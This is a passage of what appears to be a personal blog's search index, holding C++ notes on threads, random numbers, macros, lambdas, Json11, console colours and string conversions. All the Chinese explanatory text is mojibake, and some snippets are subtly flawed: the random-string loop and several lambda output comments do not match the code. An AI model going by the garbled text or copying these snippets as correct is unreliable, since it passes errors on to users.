sta1,sta2;&#125;;","tags":[{"name":"CPP","slug":"CPP","permalink":"https://hodlyounger.github.io/tags/CPP/"},{"name":"LeetCode/é˜Ÿåˆ—","slug":"LeetCode-é˜Ÿåˆ—","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E9%98%9F%E5%88%97/"},{"name":"LeetCode/æ ˆ","slug":"LeetCode-æ ˆ","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E6%A0%88/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"},{"name":"STL","slug":"B-Code/CPP/STL","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/STL/"}]},{"title":"ã€C++ã€‘å¸¸ç”¨ç¼–ç åŠç»éªŒæ•´ç†","date":"2023-10-27T01:24:02.101Z","path":"B_Code/CPP/ã€CPPã€‘å¼€å‘ç»éªŒ/","text":"æ¦‚è¿°ï¼šC++å¼€å‘è¿‡ç¨‹ä¸­é‡åˆ°çš„å¸¸ç”¨ä»£ç æ®µå’Œç»éªŒæ•´ç† [toc] ç¡çœ  123456å¤´æ–‡ä»¶å®šä¹‰ï¼š#include &lt;thread&gt;std::this_thread::sleep_for(std::chrono::milliseconds(1000));//ç¡çœ 1000æ¯«ç§’ï¼ˆ1ç§’ï¼‰ç­‰åŒï¼šstd::chrono::milliseconds dura(1000);std::this_thread::sleep_for(dura); éšæœºå­—ç¬¦ä¸² 12345678910111213141516171819202122std::string SPString::RandomString(int length)&#123; std::string chars&#123; &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot; &#125;; std::random_device rd; std::mt19937 generator(rd()); std::string output; output.reserve(length); int len_chars = chars.length(); while (length &gt; 0) &#123; auto randNumb = generator(); while (randNumb &gt; len_chars &amp;&amp; length--) &#123; output.push_back(chars[randNumb % len_chars]); randNumb /= len_chars; &#125; &#125; return output;&#125; éšæœºæ•° 1234567#include &lt;random&gt;// ç”Ÿæˆéšæœºæ•° std::random_device rd;std::mt19937 gen(rd());std::uniform_int_distribution&lt;&gt; dis(0, 999);int nId = dis(gen); ä¸´æ—¶ç¦ç”¨ç¼–è¯‘å‘Šè­¦ 1234#pragma warning(push)#pragma warning(disable:4305) pCandidate=(VOID PTR_T PTR_T)ModuleSectionInfo.pBase;#pragma warning(pop) C å¼€å‘å®æ•´ç† æ–‡ä»¶è¯»å†™æ ‡å¿— 123456789101112131415161718/* * NOTE: this is also used for opening text files. * WIN32 treats Control-Z as EOF in files opened in text mode. * Therefore, we open files in binary mode on Win32 so we can read * literal control-Z. The other affect is that we see CRLF, but * that is OK because we can already handle those cleanly. */#if defined(WIN32) || defined(__CYGWIN__)#define PG_BINARY O_BINARY#define PG_BINARY_A &quot;ab&quot;#define PG_BINARY_R &quot;rb&quot;#define PG_BINARY_W &quot;wb&quot;#else#define PG_BINARY 0#define PG_BINARY_A &quot;a&quot;#define PG_BINARY_R &quot;r&quot;#define PG_BINARY_W &quot;w&quot;#endif ç”³è¯·é‡Šæ”¾å†…å­˜ 1234567891011121314151617181920212223242526#ifdef _DEBUG // // DEBUG // #ifndef DBG_NEW #define DBG_NEW new ( _NORMAL_BLOCK , __FILE__ , __LINE__ ) #define new DBG_NEW #endif #define _CRTDBG_MAP_ALLOC #include &lt;stdlib.h&gt; #include &lt;crtdbg.h&gt; #define OS_FREE(pMem) free(pMem) #define OS_ALLOC(Size) calloc(Size,1); #define OS_DEBUG(...) _cprintf(__VA_ARGS__) #define DEBUG_BREAK() __debugbreak()#else // // RELEASE // #define OS_FREE(pMem) HeapFree(GetProcessHeap(), 0, pMem) #define OS_ALLOC(Size) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Size) #define OS_DEBUG(...) _cprintf(__VA_ARGS__) #define DEBUG_BREAK()#endif // _DEBUG ç”¨äºdebugçš„å® éœ€è¦è‡ªå·±å®ç° AutoDebugTrace éƒ¨åˆ†ï¼Œä¹Ÿå¯ç›´æ¥æ›¿æ¢ outputdebug 12#define DBUG_TRACE \\ const AutoDebugTrace _db_trace(DBUG_PRETTY_FUNCTION, __FILE__, __LINE__) windowsè·å–ntå¯¼å‡ºå‡½æ•°çš„å® 1234567891011121314151617181920212223242526272829303132333435#ifndef _MANAGED#if _MSC_VER &gt;= 1200#pragma warning(push)#pragma warning(disable:4255) // () treated as (void)#endif#ifndef _MAC#ifdef _WIN64typedef INT_PTR (FAR WINAPI *FARPROC)();typedef INT_PTR (NEAR WINAPI *NEARPROC)();typedef INT_PTR (WINAPI *PROC)();#elsetypedef int (FAR WINAPI *FARPROC)();typedef int (NEAR WINAPI *NEARPROC)();typedef int (WINAPI *PROC)();#endif // _WIN64#elsetypedef int (CALLBACK *FARPROC)();typedef int (CALLBACK *NEARPROC)();typedef int (CALLBACK *PROC)();#endif#if _MSC_VER &gt;= 1200#pragma warning(pop)#endif#elsetypedef INT_PTR (WINAPI *FARPROC)(void);typedef INT_PTR (WINAPI *NEARPROC)(void);typedef INT_PTR (WINAPI *PROC)(void);#endif#define DEFINE_NTDLL(x) _ ## x f ## x = (_ ## x)GetProcAddressNT(#x)FARPROC GetProcAddressNT(LPCSTR lpName)&#123; return GetProcAddress(GetModuleHandleW(L&quot;ntdll&quot;), lpName);&#125; C++17 [[fallthrough]] ç”¨æ³•ï¼Œåœ¨ switch caseä¸­ä¸ä¸­æ–­ç»§ç»­æ‰§è¡Œã€‚ 1234567891011121314151617181920switch (DoTrace(cs)) &#123; case ENABLE_TRACE: cs-&gt;framep-&gt;level |= TRACE_ON; if (!TRACING) break; [[fallthrough]]; // ä¸è·³å‡º switchï¼Œç»§ç»­ä¸‹ä¸€ä¸ªcase case DO_TRACE: if (TRACING) &#123; if (!cs-&gt;locked) native_mutex_lock(&amp;THR_LOCK_dbug); DoPrefix(cs, _line_); Indent(cs, cs-&gt;level); (void)fprintf(cs-&gt;stack-&gt;out_file, &quot;&gt;%.*s\\n&quot;, cs-&gt;func_len, cs-&gt;func); DbugFlush(cs); /* This does a unlock */ &#125; break; case DISABLE_TRACE: cs-&gt;framep-&gt;level &amp;= ~TRACE_ON; [[fallthrough]]; case DONT_TRACE: break;&#125; ä¿®æ”¹ cout æ–‡æœ¬é¢œè‰² 1234567891011121314151617181920212223242526272829303132333435363738394041424344//// main.cpp// ColoredHelloWorld//// Created by obaby on 14-2-27.// Copyright (c) 2014å¹´ mars. All rights reserved.// #include &lt;iostream&gt; //the following are UBUNTU/LINUX ONLY terminal color codes.#define RESET &quot;\\033[0m&quot;#define BLACK &quot;\\033[30m&quot; /* Black */#define RED &quot;\\033[31m&quot; /* Red */#define GREEN &quot;\\033[32m&quot; /* Green */#define YELLOW &quot;\\033[33m&quot; /* Yellow */#define BLUE &quot;\\033[34m&quot; /* Blue */#define MAGENTA &quot;\\033[35m&quot; /* Magenta */#define CYAN &quot;\\033[36m&quot; /* Cyan */#define WHITE &quot;\\033[37m&quot; /* White */#define BOLDBLACK &quot;\\033[1m\\033[30m&quot; /* Bold Black */#define BOLDRED &quot;\\033[1m\\033[31m&quot; /* Bold Red */#define BOLDGREEN &quot;\\033[1m\\033[32m&quot; /* Bold Green */#define BOLDYELLOW &quot;\\033[1m\\033[33m&quot; /* Bold Yellow */#define BOLDBLUE &quot;\\033[1m\\033[34m&quot; /* Bold Blue */#define BOLDMAGENTA &quot;\\033[1m\\033[35m&quot; /* Bold Magenta */#define BOLDCYAN &quot;\\033[1m\\033[36m&quot; /* Bold Cyan */#define BOLDWHITE &quot;\\033[1m\\033[37m&quot; /* Bold White */ int main(int argc, const char * argv[])&#123; // insert code here... std::cout&lt; &lt;RED &lt;&lt;&quot;Hello, World! in RED\\n&quot;; std::cout&lt;&lt;GREEN &lt;&lt;&quot;Hello, World! in GREEN\\n&quot;; std::cout&lt;&lt;YELLOW &lt;&lt;&quot;Hello, World! in YELLOW\\n&quot;; std::cout&lt;&lt;BLUE &lt;&lt;&quot;Hello, World! in BLUE\\n&quot;; std::cout&lt;&lt;MAGENTA &lt;&lt;&quot;Hello, World! in MAGENTA\\n&quot;; std::cout&lt;&lt;CYAN &lt;&lt;&quot;Hello, World! in CYAN\\n&quot;; std::cout&lt;&lt;WHITE &lt;&lt;&quot;Hello, World! in WHITE\\n&quot;; std::cout&lt;&lt;BOLDRED &lt;&lt;&quot;Hello, World! in BOLDRED\\n&quot;; std::cout&lt;&lt;BOLDCYAN &lt;&lt;&quot;Hello, World! in BOLDCYAN\\n&quot;; return 0;&#125; åœ¨ windows ä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨SetConsoleTextAttribute æ¥å£ 1234567891011121314151617181920212223242526// ColordCout.cpp : Defines the entry point for the console application.// #include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;windows .h&gt; using namespace std; void SetColor(unsigned short forecolor =4 ,unsigned short backgroudcolor =0)&#123; HANDLE hCon =GetStdHandle(STD_OUTPUT_HANDLE); //è·å–ç¼“å†²åŒºå¥æŸ„ SetConsoleTextAttribute(hCon,forecolor|backgroudcolor); //è®¾ç½®æ–‡æœ¬åŠèƒŒæ™¯è‰²&#125; int _tmain(int argc, _TCHAR* argv[])&#123; SetColor(40,30); std::cout &lt; &lt;&quot;Colored hello world for windows!\\n&quot;; SetColor(120,20); std::cout &lt;&lt;&quot;Colored hello world for windows!\\n&quot;; SetColor(10,50); std::cout &lt;&lt;&quot;Colored hello world for windows!\\n&quot;; return 0;&#125;","tags":[{"name":"CPP","slug":"CPP","permalink":"https://hodlyounger.github.io/tags/CPP/"},{"name":"Code\\CPP","slug":"Code-CPP","permalink":"https://hodlyounger.github.io/tags/Code-CPP/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"}]},{"title":"ã€CPPã€‘Json11 ç”¨æ³•æ€»ç»“","date":"2023-10-27T01:24:02.099Z","path":"B_Code/CPP/ã€CPPã€‘Json11/","text":"[toc] 1234567891011121314151617181920212223242526std::string strMsg = R&quot;(&#123; &quot;user&quot; :&quot;test&quot;, &quot;status&quot;:&quot;login&quot;, //ç™»å½•çŠ¶æ€ï¼šloginã€logout &quot;result&quot;:&quot;1&quot;, //ç™»å½•å’Œç™»å‡ºç»“æœï¼Œ1è¡¨ç¤ºæˆåŠŸï¼Œ0è¡¨ç¤ºå¤±è´¥ &quot;reason&quot;:&quot;&quot;, //åŸå› ï¼Œæ¯”å¦‚è¶…æ—¶é€€å‡ºï¼Œå‡†å…¥ç­–ç•¥é™åˆ¶å¯¼è‡´ç™»å½•å¤±è´¥ç­‰ &quot;token&quot;:&quot;xxx&quot; //tokenå†…å®¹ &#125;)&quot;; std::string strMsg_empty = &quot;&quot;; Json::object jstest = Json::object&#123;&#125;; string err; const auto json = Json::parse(strMsg_empty, err, JsonParse::COMMENTS); jstest[&quot;msgtype&quot;] = &quot;test&quot;; jstest[&quot;data&quot;] = (json); Json json1 = Json(jstest); std::cout &lt;&lt; json1.dump(); const Json obj = Json::object(&#123; &#123; &quot;msgtype&quot;, &quot;TEST&quot; &#125;, &#123; &quot;data&quot;, json &#125;, &#125;); std::cout &lt;&lt; obj.dump() &lt;&lt; std::endl;","tags":[{"name":"CPP","slug":"CPP","permalink":"https://hodlyounger.github.io/tags/CPP/"},{"name":"Json","slug":"Json","permalink":"https://hodlyounger.github.io/tags/Json/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"}]},{"title":"ã€CPPã€‘Lambdaè¡¨è¾¾å¼","date":"2023-10-27T01:24:02.099Z","path":"B_Code/CPP/ã€CPPã€‘Lambdaè¡¨è¾¾å¼/","text":"æ¦‚è¿°ï¼šlambdaè¡¨è¾¾å¼ä½¿ç”¨åŠè¯´æ˜ [toc] lambdaè¡¨è¾¾å¼è¯´æ˜ lambdaè¡¨è¾¾å¼çš„ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š 1auto func = [capture] (params) opt -&gt; ret &#123; func_body; &#125;; å…¶ä¸­ func æ˜¯å¯ä»¥å½“ä½œ lambda è¡¨è¾¾å¼çš„åå­—ï¼Œä½œä¸ºä¸€ä¸ªå‡½æ•°ä½¿ç”¨ï¼Œcapture æ˜¯æ•è·åˆ—è¡¨ï¼Œparams æ˜¯å‚æ•°è¡¨ï¼Œoptï¼š ä¸éœ€è¦å¯ä»¥çœç•¥ã€‚ ï¼ˆmutable: å¯ä»¥ä¿®æ”¹æŒ‰å€¼ä¼ é€’è¿›æ¥çš„æ‹·è´ï¼ˆæ³¨æ„æ˜¯èƒ½ä¿®æ”¹æ‹·è´ï¼Œè€Œä¸æ˜¯å€¼æœ¬èº«ï¼‰exception: æŒ‡å®šå‡½æ•°æŠ›å‡ºçš„å¼‚å¸¸ï¼Œå¦‚æŠ›å‡ºæ•´æ•°ç±»å‹çš„å¼‚å¸¸ï¼Œå¯ä»¥ä½¿ç”¨ throw ()ï¼‰ï¼Œ ret æ˜¯è¿”å›å€¼ç±»å‹ï¼Œfunc_body æ˜¯å‡½æ•°ä½“ã€‚ 12auto f = [](int a) -&gt; int &#123; return a + 1; &#125;;std::cout &lt;&lt; f(1) &lt;&lt; std::endl; // è¾“å‡º: 2 ä½¿ç”¨ lambda è¡¨è¾¾å¼æ•è·åˆ—è¡¨ lambda è¡¨è¾¾å¼è¿˜å¯ä»¥é€šè¿‡æ•è·åˆ—è¡¨æ•è·ä¸€å®šèŒƒå›´å†…çš„å˜é‡ï¼š [] ä¸æ•è·ä»»ä½•å˜é‡ã€‚ [&amp;] æ•è·å¤–éƒ¨ä½œç”¨åŸŸä¸­æ‰€æœ‰å˜é‡ï¼Œå¹¶ä½œä¸ºå¼•ç”¨åœ¨å‡½æ•°ä½“ä¸­ä½¿ç”¨ï¼ˆæŒ‰å¼•ç”¨æ•è·ï¼‰ã€‚ [=] æ•è·å¤–éƒ¨ä½œç”¨åŸŸä¸­æ‰€æœ‰å˜é‡ï¼Œå¹¶ä½œä¸ºå‰¯æœ¬åœ¨å‡½æ•°ä½“ä¸­ä½¿ç”¨ï¼ˆæŒ‰å€¼æ•è·ï¼‰ã€‚ [=ï¼Œ&amp;foo] æŒ‰å€¼æ•è·å¤–éƒ¨ä½œç”¨åŸŸä¸­æ‰€æœ‰å˜é‡ï¼Œå¹¶æŒ‰å¼•ç”¨æ•è· foo å˜é‡ã€‚ [bar] æŒ‰å€¼æ•è· bar å˜é‡ï¼ŒåŒæ—¶ä¸æ•è·å…¶ä»–å˜é‡ã€‚ [this] æ•è·å½“å‰ç±»ä¸­çš„ this æŒ‡é’ˆï¼Œè®© lambda è¡¨è¾¾å¼æ‹¥æœ‰å’Œå½“å‰ç±»æˆå‘˜å‡½æ•°åŒæ ·çš„è®¿é—®æƒé™ã€‚å¦‚æœå·²ç»ä½¿ç”¨äº† &amp; æˆ–è€… =ï¼Œå°±é»˜è®¤æ·»åŠ æ­¤é€‰é¡¹ã€‚æ•è· this çš„ç›®çš„æ˜¯å¯ä»¥åœ¨ lamda ä¸­ä½¿ç”¨å½“å‰ç±»çš„æˆå‘˜å‡½æ•°å’Œæˆå‘˜å˜é‡ã€‚ æ•è·åˆ—è¡¨ä½¿ç”¨å®ä¾‹ 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;functional&gt;using namespace std;class lambdaTest&#123;public: void output(int x, int y) &#123; //auto x1 = [] &#123;return m_number; &#125;; // error auto x2 = [=] &#123;return m_number + x + y; &#125;; // ok // auto x3 = [=] &#123; x = 2; return m_number + x + y; &#125;; // error auto x4 = [&amp;] &#123;return m_number + x + y; &#125;; // ok auto x5 = [this] &#123;return m_number; &#125;; // ok //auto x6 = [this] &#123;return m_number + x + y; &#125;; // error auto x7 = [this, x, y] &#123;return m_number + x + y; &#125;; // ok &#125; int m_number = 100;&#125;;int main()&#123; lambdaTest test; test.output(1,2);&#125; å‡½æ•° æ˜¯å¦å¯è¯» æ˜¯å¦å¯ä¿®æ”¹ è¯´æ˜ x1 âŒ âŒ é”™è¯¯ï¼Œæ²¡æœ‰æ•è·å¤–éƒ¨å˜é‡ï¼Œä¸èƒ½ä½¿ç”¨ä»»ä½•å¤–éƒ¨å˜é‡ x2 âœ”ï¸ âŒ æ­£ç¡®ï¼Œå€¼ä¼ é€’ï¼Œå¯ä»¥è®¿é—®æ‰€æœ‰å¤–éƒ¨å˜é‡ x3 âœ”ï¸ âŒ é”™è¯¯ï¼Œå€¼ä¼ é€’ï¼Œå³å€¼å¯è¯»ä¸å¯ä¿®æ”¹ x4 âœ”ï¸ âœ”ï¸ æ­£ç¡®ï¼Œå¼•ç”¨ä¼ é€’ï¼Œå¯è¯»å¯ä¿®æ”¹ x5 âœ”ï¸ thisæŒ‡é’ˆçš„æˆå‘˜å˜é‡å¯è¯»âŒ å…¶ä»–å˜é‡ä¸å¯è¯» âœ”ï¸ thisæŒ‡é’ˆçš„æˆå‘˜å¯å†™âŒ å…¶ä»–å˜é‡ä¸å¯å†™ æ­£ç¡®ï¼Œæ•è·thisæŒ‡é’ˆï¼Œå¯è®¿é—®thisæŒ‡é’ˆçš„æˆå‘˜ x6 åŒ x5 åŒ x5 é”™è¯¯ï¼Œæ•è· this æŒ‡é’ˆï¼Œx å’Œ y ä¸æ˜¯å…¶æˆå‘˜å˜é‡ï¼Œä¸å¯è®¿é—® x7 âœ”ï¸ å€¼ä¼ é€’ä¸‰ä¸ªå˜é‡ï¼Œå‡å¯è¯» âœ”ï¸ thisæŒ‡é’ˆæˆå‘˜å¯ä¿®æ”¹ âŒ x å’Œ y ä¸å¯ä¿®æ”¹ æ­£ç¡®ï¼Œæ•è· this æŒ‡é’ˆï¼Œx,y è¿”å›å€¼ lambdaè¡¨è¾¾å¼çš„è¿”å›å€¼é€šè¿‡ â€˜-&gt;â€™ ä¼ é€’ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123auto add = [](int x, int y) -&gt; int &#123; return x + y;&#125;ï¼› å¦‚ä¸Šæ‰€ç¤ºçš„è¿”å›ç±»å‹è¿˜å¯ä»¥ä½¿ç”¨ decltype æ¨å¯¼è¿”å›ç±»å‹ï¼š decltype æ˜¯ä¸€ä¸ª C++ å…³é”®å­—ï¼Œå®ƒç”¨äºåœ¨ç¼–è¯‘æ—¶æ¨æ–­è¡¨è¾¾å¼çš„ç±»å‹ã€‚è¿™åœ¨ç¼–å†™é€šç”¨ä»£ç æ—¶éå¸¸æœ‰ç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨ä½¿ç”¨ C++11 å¼•å…¥çš„ auto å…³é”®å­—å’ŒèŒƒå›´ for å¾ªç¯æ—¶ã€‚ 123auto add = [](int x, int y) -&gt; decltype(x+y) &#123; return x + y;&#125;ï¼› è¯´æ˜ï¼šdecltype(a + b) æ¨å¯¼äº† a + b çš„ç»“æœç±»å‹ï¼Œå¹¶å°†è¯¥ç±»å‹ä½œä¸º lambda å‡½æ•°çš„è¿”å›ç±»å‹ã€‚ ç”šè‡³ï¼Œä» C++14 å¼€å§‹ï¼Œè¿˜å¯ä»¥ä½¿ç”¨æ›´ç®€æ´çš„æ–¹å¼æ¥æ¨å¯¼ lambda å‡½æ•°çš„è¿”å›ç±»å‹ï¼Œå³ä½¿ç”¨ auto å…³é”®å­—ã€‚ä¾‹å¦‚ï¼š 1auto myLambda = [](int a, int b) -&gt; auto &#123; return a + b; &#125;; éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨ auto æ¨å¯¼è¿”å›ç±»å‹çš„ lambda å‡½æ•°åœ¨æŸäº›æƒ…å†µä¸‹å¯èƒ½ä¼šå¼•å‘æ­§ä¹‰ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ åœ¨ lambda è¡¨è¾¾å¼ä¸­è¿”å›ä¸€ä¸ªåµŒå¥—ç±»å‹ï¼ˆå¦‚ std::pairï¼‰ï¼Œauto å¯èƒ½ä¼šè¢«æ¨å¯¼ä¸º std::pairï¼Œè€Œä¸æ˜¯ä½ æœŸæœ›çš„åµŒå¥—ç±»å‹çš„å…·ä½“ç±»å‹ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½¿ç”¨ decltype å¯ä»¥æ›´æ˜ç¡®åœ°æŒ‡å®šè¿”å›ç±»å‹ã€‚ å…¶ä»–å…³é”®å­— ä½¿ç”¨ lambda è¡¨è¾¾å¼æ•è·åˆ—è¡¨æ•è·å¤–éƒ¨å˜é‡ï¼Œå¦‚æœå¸Œæœ›å»ä¿®æ”¹æŒ‰å€¼æ•è·çš„å¤–éƒ¨å˜é‡ï¼Œé‚£ä¹ˆåº”è¯¥å¦‚ä½•å¤„ç†å‘¢ï¼Ÿè¿™å°±éœ€è¦ä½¿ç”¨ mutable é€‰é¡¹ï¼Œè¢«mutableä¿®æ”¹æ˜¯lambdaè¡¨è¾¾å¼å°±ç®—æ²¡æœ‰å‚æ•°ä¹Ÿè¦å†™æ˜å‚æ•°åˆ—è¡¨ï¼Œå¹¶ä¸”å¯ä»¥å»æ‰æŒ‰å€¼æ•è·çš„å¤–éƒ¨å˜é‡çš„åªè¯»ï¼ˆconstï¼‰å±æ€§ã€‚ mutable 123int a = 0;auto f1 = [=] &#123;return a++; &#125;; // error, æŒ‰å€¼æ•è·å¤–éƒ¨å˜é‡, aæ˜¯åªè¯»çš„auto f2 = [=]()mutable &#123;return a++; &#125;; // ok ğŸ’â€â™‚ï¸ æ³¨æ„ï¼šmutable åªæ˜¯å…è®¸åœ¨å‡½æ•°å†…éƒ¨ä¿®æ”¹å€¼è€Œå·²ï¼Œä½œç”¨åŸŸä»…é™äº lambda å‡½æ•°å†…éƒ¨ï¼Œå‚è€ƒä»¥ä¸‹ä»£ç åŠè¾“å‡ºï¼š 12345678910111213141516171819202122232425262728void lambdaFunc()&#123; auto add1 = [](int x, int y) -&gt; int &#123; return x + y; &#125;; auto add2 = [](int x, int y) -&gt; decltype(x + y) &#123; return x + y; &#125;; auto add3 = [](int a, int b) -&gt; auto &#123; return a + b; &#125;; auto modify_add = [](int a, int b) mutable -&gt; auto &#123; a = 3; return a + b; &#125;; auto value_modify_add = [=](int a, int b) mutable -&gt; auto &#123; a = 4; return a + b; &#125;; auto refrence_modify_add = [&amp;](int a, int b) mutable -&gt; auto &#123; a = 5; return a + b; &#125;; auto refrence_modify_add_byRef = [&amp;](int&amp; a, int b) mutable -&gt; auto &#123; a = 6; return a + b; &#125;; int x = 2, y = 2; cout &lt;&lt; &quot;add1:&quot; &lt;&lt; add1(x, y) &lt;&lt; endl; // add1:4 cout &lt;&lt; &quot;add2:&quot; &lt;&lt; add2(x, y) &lt;&lt; endl; // add2:4 cout &lt;&lt; &quot;add3:&quot; &lt;&lt; add3(x, y) &lt;&lt; endl; // add3:4 cout &lt;&lt; &quot;modify_add:&quot; &lt;&lt; value_modify_add(x, y) &lt;&lt; endl; // modify_add:5 cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; endl; // x=2 cout &lt;&lt; &quot;value_modify_add:&quot; &lt;&lt; value_modify_add(x, y) &lt;&lt; endl; // value_modify_add:6 cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; endl; // x=2 cout &lt;&lt; &quot;value_modify_add:&quot; &lt;&lt; refrence_modify_add(x, y) &lt;&lt; endl; // value_modify_add:7 cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; endl; // x=2 cout &lt;&lt; &quot;refrence_modify_add_byRef:&quot; &lt;&lt; refrence_modify_add_byRef(x, y) &lt;&lt; endl; // refrence_modify_add_byRef:8 cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; endl; // x=6&#125; å…³äºä¸ºä»€ä¹ˆé€šè¿‡å€¼æ‹·è´çš„æ–¹å¼æ•è·çš„å¤–éƒ¨å˜é‡æ˜¯åªè¯»çš„: lambdaè¡¨è¾¾å¼çš„ç±»å‹åœ¨C11ä¸­ä¼šè¢«çœ‹åšæ˜¯ä¸€ä¸ªå¸¦ operator() çš„ç±»ï¼Œå³ä»¿å‡½æ•°ã€‚ æŒ‰ç…§Cæ ‡å‡†ï¼Œlambdaè¡¨è¾¾å¼çš„ operator() é»˜è®¤æ˜¯ const çš„ï¼Œä¸€ä¸ª const æˆå‘˜å‡½æ•°æ˜¯æ— æ³•ä¿®æ”¹æˆå‘˜å˜é‡å€¼çš„ã€‚ mutable é€‰é¡¹çš„ä½œç”¨å°±åœ¨äºå–æ¶ˆ operator () çš„ const å±æ€§ã€‚ å› ä¸º lambda è¡¨è¾¾å¼åœ¨ C++ ä¸­ä¼šè¢«çœ‹åšæ˜¯ä¸€ä¸ªä»¿å‡½æ•°ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨std::functionå’Œstd::bindæ¥å­˜å‚¨å’Œæ“ä½œlambdaè¡¨è¾¾å¼ï¼š 1234567891011121314151617181920212223void testLambdawithfunction()&#123; // åŒ…è£…å¯è°ƒç”¨å‡½æ•° std::function&lt;int(int)&gt; f1 = [](int a) &#123;return a; &#125;; // ç»‘å®šå¯è°ƒç”¨å‡½æ•° std::function&lt;int(int)&gt; f2 = bind([](int a) &#123;return a; &#125;, placeholders::_1); // ç»‘å®šå¯ä¿®æ”¹çš„å‡½æ•° std::function&lt;int(int&amp;, int)&gt; f3 = [](int&amp; a, int b) &#123; a = 3; return a + b; &#125;; // ç»‘å®šå¯ä¿®æ”¹çš„å‡½æ•° std::function&lt;int(int&amp;, int)&gt; f4 = bind([](int&amp; a, int b) &#123; a = 4; return a + b; &#125;, std::placeholders::_1, std::placeholders::_2); int x = 2, y = 2; // å‡½æ•°è°ƒç”¨ cout &lt;&lt; &quot;f1(100)&quot; &lt;&lt; f1(100) &lt;&lt; endl; // f1(100)100 cout &lt;&lt; &quot;f2(200)&quot; &lt;&lt; f2(200) &lt;&lt; endl; // f2(200)200 cout &lt;&lt; &quot;f3(x, y)&quot; &lt;&lt; f3(x, y) &lt;&lt; endl; // f3(x, y)5 cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; endl; // x=3 cout &lt;&lt; &quot;f3(x, y)&quot; &lt;&lt; f4(x, y) &lt;&lt; endl; // f3(x, y)6 cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; endl; // x=4&#125; å¯¹äºæ²¡æœ‰æ•è·ä»»ä½•å˜é‡çš„ lambda è¡¨è¾¾å¼ï¼Œè¿˜å¯ä»¥è½¬æ¢æˆä¸€ä¸ªæ™®é€šçš„å‡½æ•°æŒ‡é’ˆï¼š 123456789using func_ptr = int(*)(int);// æ²¡æœ‰æ•è·ä»»ä½•å¤–éƒ¨å˜é‡çš„åŒ¿åå‡½æ•°func_ptr f = [](int a)&#123; return a; &#125;;// å‡½æ•°è°ƒç”¨f(1314); å‚è€ƒæ–‡ç«  C++â€”â€”Lambdaå‡½æ•°_c++ lambdaå‡½æ•°_å‹¿åœ¨æµ®æ²™ç¯‰é«˜è‡ºçš„åšå®¢-CSDNåšå®¢","tags":[{"name":"CPP","slug":"CPP","permalink":"https://hodlyounger.github.io/tags/CPP/"},{"name":"std::bind","slug":"std-bind","permalink":"https://hodlyounger.github.io/tags/std-bind/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"}]},{"title":"å­—ç¬¦ä¸²ç±»å‹è½¬æ¢æ•´ç†(charã€TCHARã€stringã€wstringã€CStringã€WCHAR)","date":"2023-10-27T01:24:02.099Z","path":"B_Code/CPP/ã€CPPã€‘å­—ç¬¦ä¸²ç±»å‹ç›¸äº’è½¬æ¢/","text":"[TOC] string &lt;â€“&gt; CString string -&gt; CString 12345std::string str = &quot;string&quot;;CString csRet;// csRet.Format(&quot;%s&quot;, str.c_str());// å¦‚æœä¸Šå¥æŠ¥é”™å°±ä½¿ç”¨csRet.Format(_T(&quot;%s&quot;), str.c_str()); CString -&gt; string 123CString cstr(&quot;string&quot;);string string &lt; â€“ &gt; wstring string -&gt; wstring solution 1ï¼š 12345678910#include &lt;string&gt;#include &lt;locale&gt;#include &lt;codecvt&gt; //convert string to wstringinline std::wstring to_wide_string(const std::string&amp; input)&#123; std::wstring_convert&lt;std::codecvt_utf8&lt;wchar_t&gt;&gt; converter; return converter.from_bytes(input);&#125; solution 2: 1234567891011121314151617wstring stringToWstring(std::string str)&#123; wstring result = L&quot;&quot;; int nLen = MultiByteToWideChar(CP_ACP, 0, str.c_str(), str.size(), NULL, 0); if (nLen == 0) return result; TCHAR* buffer = new TCHAR[nLen + 1]; MultiByteToWideChar(CP_ACP, 0, str.c_str(), str.size(), buffer, nLen); buffer[nLen] = &#x27;\\0&#x27;; result.append(buffer); delete[] buffer; return result;&#125; wstring -&gt; string 123456//convert wstring to string inline std::string to_byte_string(const std::wstring&amp; input)&#123; std::wstring_convert&lt;std::codecvt_utf8&lt;wchar_t&gt;&gt; converter; return converter.to_bytes(input);&#125; DWORD &lt;â€”&gt; string 12345string DwordToString(DWORD val)&#123; string cur_str = to_string(long long (val)); return cur_str;&#125; 123456DWORD StringToDword(string val)&#123; DWORD cur_dword; sscanf(val.c_str(),&quot;%ul&quot;,&amp;cur_dword); return cur_dword;&#125; æ›´å¤šæŸ¥çœ‹å·²å®ç°çš„ç¼–ç 